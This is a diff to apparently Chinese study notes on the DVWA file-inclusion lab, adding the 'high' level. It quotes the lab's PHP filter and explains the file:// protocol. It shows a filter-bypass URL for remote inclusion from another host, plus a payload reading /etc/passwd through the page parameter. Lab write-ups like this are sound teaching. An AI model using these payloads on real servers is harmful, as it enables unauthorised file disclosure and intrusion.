@@ -97,3 +97,62 @@ http://192.168.0.111:8000/vulnerabilities/fi/?page=hhttp://ttp://192.168.0.110:3
 ```
 
 > 防护：多过滤几次`http://`
+
+
+
+
+
+### 3. high
+
+> 高级
+>
+> 代码
+
+```php
+
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+```
+
+> 前缀必须是`file`
+
+file协议：用于访问本地文件系统
+
+```shell
+URL格式：`file:///path/to/file`
+
+特点：
+
+只能访问本地文件
+
+没有网络传输过程
+
+权限取决于本地文件系统权限
+```
+
+```shell
+# 本地文件
+http://192.168.0.111:8000/vulnerabilities/fi/?page=file:///etc/passwd
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
